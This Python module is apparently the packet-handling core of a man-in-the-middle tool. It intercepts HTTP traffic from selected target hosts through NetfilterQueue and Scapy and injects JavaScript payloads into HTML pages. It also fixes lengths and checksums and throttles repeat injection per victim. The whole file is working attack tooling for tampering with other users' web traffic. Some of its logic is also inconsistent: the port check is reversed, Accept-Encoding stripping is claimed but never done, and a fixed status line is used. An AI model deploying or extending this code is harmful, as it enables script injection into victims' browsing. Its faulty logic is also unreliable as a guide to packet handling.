"""
Packet handler for HTTP traffic interception and modification.

This module handles the core packet processing logic:
- Parsing HTTP requests/responses
- Stripping Accept-Encoding to defeat gzip
- Injecting JavaScript payloads
- Recalculating Content-Length
- Handling chunked transfer encoding
"""

import re
import socket
from typing import Optional, Tuple, Dict, Set
from dataclasses import dataclass
from datetime import datetime

from scapy.all import IP, TCP, Raw
from netfilterqueue import Packet

from ..injectors.base import BaseInjector
from ..config.settings import InjectionConfig


@dataclass
class InjectionStats:
    """Statistics for injection operations."""
    packets_processed: int = 0
    http_responses_seen: int = 0
    injection_attempts: int = 0
    successful_injections: int = 0
    skipped_responses: int = 0
    content_length_errors: int = 0
    chunked_responses: int = 0


class PacketHandler:
    """
    Handler for processing and modifying HTTP packets.
    
    This class implements the core MITM logic for intercepting HTTP traffic
    and injecting JavaScript payloads into HTML responses.
    """
    
    def __init__(
        self,
        injector: BaseInjector,
        config: InjectionConfig,
        targets: Set[str],
        verbose: bool = False
    ):
        """
        Initialize the packet handler.
        
        Args:
            injector: The injection strategy to use
            config: Injection configuration
            targets: Set of allowed target IP addresses
            verbose: Enable verbose logging
        """
        self.injector = injector
        self.config = config
        self.targets = targets
        self.verbose = verbose
        
        self.stats = InjectionStats()
        
        # Session tracking for throttling
        self.session_injection_times: Dict[str, datetime] = {}
        
        # Domain/path targeting
        self.domain_whitelist = set(config.domain_whitelist)
        self.path_whitelist = set(config.path_whitelist)
        self.domain_blacklist = set(config.domain_blacklist)
        self.path_blacklist = set(config.path_blacklist)
    
    def handle_packet(self, packet: Packet) -> None:
        """
        Process a single packet from the NFQUEUE.
        
        Args:
            packet: NetfilterQueue packet object
        """
        self.stats.packets_processed += 1
        
        try:
            # Parse the packet with Scapy
            payload = packet.get_payload()
            pkt = IP(payload)
            
            # Only process TCP packets
            if not pkt.haslayer(TCP):
                packet.accept()
                return
            
            # Only process packets with payload (HTTP data)
            if not pkt.haslayer(Raw):
                packet.accept()
                return
            
            # Check if this is an HTTP response (destination port 80)
            if pkt[TCP].dport != 80:
                packet.accept()
                return
            
            # Check if source IP is in targets
            src_ip = pkt[IP].src
            if src_ip not in self.targets:
                packet.accept()
                return
            
            # Process HTTP response
            self._process_http_response(packet, pkt, src_ip)
            
        except Exception as e:
            if self.verbose:
                print(f"Error processing packet: {e}")
            packet.accept()
    
    def _process_http_response(self, packet: Packet, pkt: IP, src_ip: str) -> None:
        """
        Process an HTTP response packet.
        
        Args:
            packet: NetfilterQueue packet object
            pkt: Scapy IP packet
            src_ip: Source IP address
        """
        try:
            # Extract HTTP data
            http_data = pkt[Raw].load.decode('utf-8', errors='ignore')
            
            # Check if it's an HTTP response
            if not http_data.startswith('HTTP/'):
                packet.accept()
                return
            
            self.stats.http_responses_seen += 1
            
            # Parse HTTP headers and body
            headers, body = self._parse_http_response(http_data)
            
            # Check Content-Type
            content_type = headers.get('Content-Type', '')
            if self.config.only_text_html and 'text/html' not in content_type:
                self.stats.skipped_responses += 1
                packet.accept()
                return
            
            # Check domain/path targeting rules
            if not self._check_targeting_rules(headers, body):
                self.stats.skipped_responses += 1
                packet.accept()
                return
            
            # Check throttling
            session_id = self._get_session_id(headers, src_ip)
            if self._is_throttled(session_id):
                self.stats.skipped_responses += 1
                packet.accept()
                return
            
            # Check for chunked encoding
            transfer_encoding = headers.get('Transfer-Encoding', '').lower()
            is_chunked = 'chunked' in transfer_encoding
            
            if is_chunked:
                self.stats.chunked_responses += 1
                if self.config.chunked_handling == 'dechunk':
                    # De-chunk, inject, and convert to Content-Length
                    body = self._dechunk_body(body)
                    del headers['Transfer-Encoding']
                elif self.config.chunked_handling == 'passthrough':
                    # Skip chunked responses
                    self.stats.skipped_responses += 1
                    packet.accept()
                    return
                else:
                    # Error on chunked
                    if self.verbose:
                        print(f"Skipping chunked response from {src_ip}")
                    self.stats.skipped_responses += 1
                    packet.accept()
                    return
            
            # Strip Accept-Encoding if configured
            # (This is done on requests, not responses, but we handle it here for completeness)
            
            # Check if injection should occur
            if not self.injector.should_inject(body):
                packet.accept()
                return
            
            self.stats.injection_attempts += 1
            
            # Perform injection
            modified_body = self._inject_payload(body)
            
            if modified_body == body:
                # No injection occurred
                packet.accept()
                return
            
            self.stats.successful_injections += 1
            
            # Update Content-Length
            headers['Content-Length'] = str(len(modified_body.encode('utf-8')))
            
            # Rebuild HTTP response
            modified_http = self._rebuild_http_response(headers, modified_body)
            
            # Update packet payload
            pkt[Raw].load = modified_http.encode('utf-8')
            
            # Recalculate checksums
            del pkt[IP].chksum
            del pkt[TCP].chksum
            
            # Set modified payload
            packet.set_payload(bytes(pkt))
            
            if self.verbose:
                print(f"Injected payload into response from {src_ip}")
            
            # Accept the modified packet
            packet.accept()
            
            # Update session tracking
            self.session_injection_times[session_id] = datetime.now()
            
        except Exception as e:
            if self.verbose:
                print(f"Error processing HTTP response: {e}")
            self.stats.content_length_errors += 1
            packet.accept()
    
    def _parse_http_response(self, http_data: str) -> Tuple[Dict[str, str], str]:
        """
        Parse HTTP response into headers and body.
        
        Args:
            http_data: Raw HTTP response string
            
        Returns:
            Tuple of (headers dict, body string)
        """
        lines = http_data.split('\r\n')
        
        # Skip status line
        headers = {}
        body_start = 0
        
        for i, line in enumerate(lines[1:], 1):
            if not line:
                body_start = i + 1
                break
            
            if ':' in line:
                key, value = line.split(':', 1)
                headers[key.strip()] = value.strip()
        
        body = '\r\n'.join(lines[body_start:])
        
        return headers, body
    
    def _rebuild_http_response(self, headers: Dict[str, str], body: str) -> str:
        """
        Rebuild HTTP response from headers and body.
        
        Args:
            headers: HTTP headers dictionary
            body: HTTP body string
            
        Returns:
            Complete HTTP response string
        """
        header_lines = []
        
        for key, value in headers.items():
            header_lines.append(f"{key}: {value}")
        
        return "HTTP/1.1 200 OK\r\n" + "\r\n".join(header_lines) + "\r\n\r\n" + body
    
    def _inject_payload(self, body: str) -> str:
        """
        Inject the JavaScript payload into the HTML body.
        
        Args:
            body: HTML body string
            
        Returns:
            Modified HTML body with injected payload
        """
        payload = self.injector.get_payload()
        injection_point = self.injector.get_injection_point()
        
        if injection_point not in body:
            return body
        
        # Inject before the closing body tag
        return body.replace(injection_point, payload + injection_point)
    
    def _dechunk_body(self, chunked_body: str) -> str:
        """
        De-chunk a chunked HTTP response body.
        
        Args:
            chunked_body: Chunked transfer encoding body
            
        Returns:
            De-chunked body
        """
        # Simple chunked decoding
        parts = chunked_body.split('\r\n')
        decoded = []
        i = 0
        
        while i < len(parts):
            chunk_size_line = parts[i].strip()
            if not chunk_size_line:
                i += 1
                continue
            
            try:
                chunk_size = int(chunk_size_line, 16)
                if chunk_size == 0:
                    break
                
                i += 1
                if i < len(parts):
                    chunk_data = parts[i][:chunk_size]
                    decoded.append(chunk_data)
                
                i += 1
            except ValueError:
                break
        
        return ''.join(decoded)
    
    def _check_targeting_rules(self, headers: Dict[str, str], body: str) -> bool:
        """
        Check domain and path targeting rules.
        
        Args:
            headers: HTTP headers
            body: HTTP body
            
        Returns:
            True if targeting rules allow injection
        """
        host = headers.get('Host', '')
        
        # Check domain whitelist
        if self.domain_whitelist:
            if not any(domain in host for domain in self.domain_whitelist):
                return False
        
        # Check domain blacklist
        if self.domain_blacklist:
            if any(domain in host for domain in self.domain_blacklist):
                return False
        
        # Check path whitelist (simplified - would need full URL parsing)
        if self.path_whitelist:
            # For now, check if any whitelist path is in the body
            if not any(path in body for path in self.path_whitelist):
                return False
        
        # Check path blacklist
        if self.path_blacklist:
            if any(path in body for path in self.path_blacklist):
                return False
        
        return True
    
    def _get_session_id(self, headers: Dict[str, str], src_ip: str) -> str:
        """
        Generate a session ID for throttling.
        
        Args:
            headers: HTTP headers
            src_ip: Source IP address
            
        Returns:
            Session identifier string
        """
        # Use IP and User-Agent for session identification
        user_agent = headers.get('User-Agent', '')
        return f"{src_ip}:{hash(user_agent)}"
    
    def _is_throttled(self, session_id: str) -> bool:
        """
        Check if a session is throttled.
        
        Args:
            session_id: Session identifier
            
        Returns:
            True if throttled, False otherwise
        """
        if not self.config.throttle_per_target:
            return False
        
        if session_id not in self.session_injection_times:
            return False
        
        last_injection = self.session_injection_times[session_id]
        elapsed = (datetime.now() - last_injection).total_seconds()
        
        return elapsed < self.config.reinjection_delay
    
    def get_stats(self) -> InjectionStats:
        """
        Get current injection statistics.
        
        Returns:
            InjectionStats object with current statistics
        """
        return self.stats
    
    def reset_stats(self) -> None:
        """Reset injection statistics."""
        self.stats = InjectionStats()
